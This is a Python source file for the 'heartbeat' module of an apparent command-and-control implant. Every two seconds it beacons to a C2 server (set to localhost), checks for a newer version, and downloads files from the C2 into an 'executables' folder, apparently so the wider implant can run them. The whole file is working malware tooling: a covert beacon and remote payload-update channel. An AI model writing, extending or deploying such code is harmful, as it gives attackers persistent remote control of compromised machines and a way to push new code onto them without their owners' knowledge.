import os
import requests

from .common import IntervalExecutable


class HeartbeatModule(IntervalExecutable):
    """Send a heartbeat back to C2"""

    interval = 2

    C2_DOMAIN = "http://localhost:8000"
    VERSION_FILE = "version.txt"

    @staticmethod
    def execute() -> None:
        response = requests.post(url=HeartbeatModule.C2_DOMAIN + "/heartbeat")

        if response.status_code != 200:
            print("Error:", response.content)
            return

        latest_version = response.json().get("version")
        print("Latest Version:", latest_version)

        if not os.path.exists(HeartbeatModule.VERSION_FILE):
            HeartbeatModule.download_updates(-1)
        else:
            with open(HeartbeatModule.VERSION_FILE, "r") as f:
                local_version = int(f.read())

            if latest_version > local_version:
                HeartbeatModule.download_updates(int(local_version))

        with open(HeartbeatModule.VERSION_FILE, "w") as f:
            f.write(str(latest_version))

    @staticmethod
    def download_updates(local_version: int) -> None:
        print(f"Downloading since v{local_version}...")
        updates_res = requests.get(
            url=f"{HeartbeatModule.C2_DOMAIN}/updates?version={local_version}"
        )

        if updates_res.status_code != 200:
            print("Error fetching updates:", updates_res.content)

        filenames = updates_res.json().get("filenames")

        for fn in filenames:
            file_res = requests.get(url=f"{HeartbeatModule.C2_DOMAIN}/updates/{fn}")

            if file_res.status_code != 200:
                print(f"Error fetching {fn}: {file_res.content}")

            with open(f"executables/{fn}", "w") as f:
                f.write(file_res.content.decode("utf-8"))
